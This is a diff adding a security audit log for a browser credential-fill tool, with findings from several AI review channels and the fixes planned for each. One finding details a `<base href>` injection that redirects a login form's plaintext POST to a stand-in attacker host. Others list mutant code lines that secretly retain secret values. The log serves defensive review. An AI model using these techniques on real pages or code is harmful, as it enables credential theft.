@@ -896,3 +896,122 @@ Interpretation: no consistent direction (not a content-dependent channel); ident
 ```
 
 Decision pending with the user (PLAN.md Decisions Log, 2026-09-02 "OPEN"); M4 not marked complete until resolved.
+
+---
+
+## Post-M4 whole-codebase audit (§9.2, carrying §9.1) — 2026-09-02, on 305da22
+
+One Claude channel (isolated worktree, real Chromium), reviewing the entire tree — not a diff — against the locked
+spec's invariants, with `PROJECT-SPEC.md` §9.1's simplification question folded in. Register ids `A-*`.
+
+### P1
+- **A-1 `<base href>` bypass of the form-action check** (`src/browser/inRealm.ts`, `DESTINATION_PREDICATES_SOURCE`).
+  `action` and every `formaction` are resolved against `location.href`; HTML resolves them against
+  `document.baseURI`, which `<base href>` overrides. Real-Chromium exploit: a page at the authorized origin carrying
+  `<base href="http://ATTACKER/">` and `action="/login"` → fill `{ ok: true }`; the browser's POST lands at the
+  attacker with the plaintext. In scope by precedent (same class as clobbering / `formaction`; reachable from an
+  HTML-injection sink with no script). Layer 4 measures the consequence; layers 1–2 do not fire. **Absorb:** read the
+  base URL natively (`Node.prototype.baseURI` getter), refuse (`identity`) when its origin differs from
+  `location.origin`, resolve `action`/`formaction` against it; fake-DOM tests, lab routes, a between-pin-and-inject
+  decorator case, and a real-browser reproduction asserting the second origin receives nothing.
+
+### P2
+- **A-2 The per-run positive control throws for any run without an authorized canary POST**, so
+  `taskCompleted: false` is unreachable and the locked pass criterion's second clause is dead; a derailed M5/M6 run
+  crashes `make eval` instead of scoring. **Absorb:** split roles — a per-run assertion gated on
+  `completion.taskCompleted === true`, plus an evaluation-level positive control (≥ 1 run per scenario × agent cell
+  shows the canary in the real login POST, cross-checked against the fixture capture).
+- **A-3 An observation with no origin is scored as a wrong-origin attempt** (`about:blank`; a step-0 refusal before
+  `observeTop`, e.g. `fields: []` at the canonical origin) — caller-controllable over-reporting of
+  `wrongOriginBlocked`. Q4-7's removal of the `origin === undefined` conjunct was wrong. **Absorb:** attempts require
+  a successfully observed string origin; the step-0 observation is emitted only after `validateRequest` succeeds.
+
+### P3 (absorbed unless marked)
+`secretMatcher.ts` and `leakScan.ts` matcher blocks are byte-identical, so "deliberately independent" is false
+(A-4) → **share** from `src/shared/secretTransforms.ts`; layer-4 independence is delivered by `metaGate`'s
+independently authored fixtures, and the comment says so; `browserPort.ts` "inject never rejects" is false since
+T2-5 (A-5) → the single rejecting precondition is stated on the type; browser controls can reject via `captured()`
+(A-6) → wrapped to the fixed closed result; `resolveTaintedObjects` drops an unresolvable tainted node from the
+current snapshot (A-7) → fail closed; the CR/LF precondition is writer-only (A-8) → **contract amendment 086914b:**
+`InjectOutcome` gains `reason: 'unplaceable'`, refused at inject before any CDP call and mapped to `backend-error`.
+**Probe 10:** the per-run vault and key sit in the run directory, so the canary is trivially recoverable from the
+bundle → added to the by-design plaintext list (with `events.json`, `offline-evidence.json`, the `*.requests`
+capture); the runner's canary-file enumeration test names them.
+
+### §9.1 answer (LOC-budget simplification)
+**Removable without weakening an invariant:** `LockdownRegistry.isSameIdentity` (no production caller); the
+duplicated matcher (~38 lines, A-4); one of the two host-side snapshot-node narrowings; `TranscriptWriter.snapshotEvents`'s
+public surface. **Lower confidence, left for the user:** `SessionMutex.#closedSessions`; `fillService.boundaryFailure()`'s
+re-validation. **Load-bearing (keep):** the `safeEpoch` check; the post-`resolveSecret` `isLocked` re-check;
+`reobservedOrigin` + asserted events; in-run `leakScan`/`wrongOrigin` + `assertOutcomeAgreement`;
+`assertRunInventory`; `too-long`; `pinnedObjects`; `walkEntry`'s unreachable branch (a fail-closed default).
+
+### Re-ratings
+`browser_snapshot` is not in the eval tool set, so the "layer 4 measures mirrors and snapshots" residual is
+unexercised → **open coverage gap, owner M5** (the `/mirror-span` lab route exists; the tool is added to the eval
+tool set in the final slice so the gap becomes measurable). Anti-fabrication-by-re-run is weakened by A-2 until
+fixed. The plaintext-artifact list was incomplete (probe 10).
+
+## Final round — three channels on 76035cc..305da22 (both fix slices) — 2026-09-02
+
+Claude QA (`F-Q*`, wt-review, real Chromium), Claude security (`F-S*`, wt-security, real Chromium), Codex
+(`F-X*`, gpt-5.6-sol xhigh, read-only, pinned range; Vitest and the selftest could not run in its sandbox —
+`tsc`, the gate and `diff --check` did). All three: **NEEDS-ATTENTION; no leak bypass or fabrication path found.**
+Every T3-*/T4-* and P3 absorption is CLOSED with a named killing assertion in all three closure tables except the
+items below.
+
+### P1 — the retention rule, round six (F-S1 / F-Q1 / F-X1; all three channels, independent mutant sets)
+`inspectTaintedUses` (`src/browser/retention.test.ts`) enumerates permitted syntax but has no terminal positive pass
+— the Secret-object rule (`inspectSecretUses`) does. Surviving mutants, each confirmed against the exact 305da22
+checker, several with a real-browser read-back of the plaintext while the file stays green:
+- security: `value.replace(/[\s\S]/gu, u => { moduleStash += u; return u })`; `[hex].forEach(h => { moduleStash = h })`;
+  `value.split('').forEach(u => moduleUnits.push(u))` (receiver-tainted method calls with laundering callbacks);
+- QA: `throw hex;` / `throw value;` in `injectDestination` and inside `toFixedHex` (no `ThrowStatement` sink);
+  a module-local `function String(input)` that retains — the `String` sink is allowed without a module-locality check;
+- Codex: `value.replace(/./gs, captureEach)`; `for (const ch of value) moduleStash += ch`; a `String.prototype`
+  accessor reached through `value.captureForTest` storing `String(this)`.
+**Absorb (security core):** every identifier occurrence of a tainted binding is permitted ONLY as a `const`
+initialiser, an argument of the single module-local `callFunctionOn`, an argument of `String`/`toFixedHex` when no
+module-local function of that name exists, or a `.length`/`.padStart` read; everything else — call receivers,
+array/object/template elements, `throw`/`return` operands, assignment RHS, computed keys, `for…of` sources, any
+other property access, callback arguments — is a violation. `throw` becomes a sink for the Secret rule too. The
+eight mutants above join the corpus as named killed mutants S1–S8; `inspectTaintedUses` is split under 50 lines.
+
+### P2
+- **F-S2 / F-X2 / QA residual — probe P is not a reliable completion gate.** Security: `npm test` red 2/3 runs at
+  HEAD from the serial timing invocation (`tripwire-match-vs-no-match` p=0.0065, `reflection-equal-length`
+  p=0.0022, `tripwire-real-click` p=0.0014; |median Δ| ≤ 0.17 ms), the timing file alone green 6/6 twice. QA on the
+  same machine: 10 observations of every gate, 0 rejections (marginals p=0.0270 and p=0.0403, signs varying). Codex:
+  the recorded serial rejections stand. **Not a code fix; the OPEN p-clause decision in `PLAN.md` — thresholds,
+  samples and warm-up untouched.** The measurement is load-sensitive by construction (three reviews and a Codex job
+  ran concurrently with the security channel's runs).
+- **F-S3 / F-Q2 `validateScenarioAuth` guards the object that is thrown away.** Both eval paths overwrite
+  `secretSources` from the agent config after validation; deleting either call site leaves the suite green (the T4-1
+  pattern, and the call-site convention recorded this session, not applied to T4-3's own guard). Latent at HEAD.
+  **Absorb:** validate the MERGED auth in `authForAgent` and `recomputeRun`; call-site tests for a poisoned agent
+  config on both paths and for the registry.
+
+### P3 (absorbed unless marked)
+A `closeAll` throw escapes `runEval` verbatim (F-S4) → fixed diagnostic; the toolchain half of the `node:module`
+prohibition has no fixture though the line is load-bearing (F-Q3) → selftest fixture; `wrongOrigin.ts:30`'s
+missing-`requestId` throw is untested (F-Q4) → unit case; **undeclared reordering:** `rm -rf artifactDirectory` now
+precedes the checker meta-gate, so a meta-gate failure destroys the previous bundle (F-Q5) → meta-gate first, with a
+test; the serial-timing `test` script is unguarded (F-Q6) → asserted; `inspectTaintedUses` 58 lines (F-Q7);
+duplicated `describe` names from the split (F-Q8); the `createHost` failure path skips `backend.dispose()` (F-Q9);
+`fillService.ts`'s `isRecord` still `any` (QA gap); the `4096` derivation in `ASSIGN_SOURCE` has no killing source
+test (F-X3) → AST assertion tying the loop bound to `MAX_SECRET_CODE_UNITS`. **Recorded, no test:** the
+`createLockdownDomain` extraction (F-X4) and the stub's `unknown` (F-X5) are refactors with no behavioural mutant;
+the literal-`4096` mutant is otherwise equivalent (QA); `browser_snapshot` gained `assertLeaseActive` in fix-c3b —
+in scope for S3-5 but undeclared (QA residual; the tripwire exemption still holds); c4's "comment atop
+`runner.test.ts`" landed atop `runner.wiring.test.ts`.
+**Ownership:** both slices compliant (Codex: the `host.test.ts:178` edit was outside the clause but declared in the
+Deviations stanza — not silent). **Residuals restated:** the post-loop drain is load-bearing only in the Node
+harness (in the real eval the login POST lands in the `click` drain 10/10); same-process initiator fabrication;
+`dom-fill` has no recorder independent of the runner (network-body is bound by the fixture capture); the retention
+rule's file set (`session.ts`, `fillService.ts`) is an assumption.
+
+### Disposition
+**Not merge-ready as committed; no leak bypass or fabrication path found.** One combined fix slice (`m4-fix-final`,
+Codex) implements A-1..A-8, the §9.1 removals, and F-S1/F-Q1/F-X1, F-S3/F-Q2, the P3s above, each with its killing
+test; the integrator runs the browser suites and `make eval`; the three channels review that diff (security core
+changed: `inRealm.ts`, the retention rule); probe P's p-clause stays a user decision.
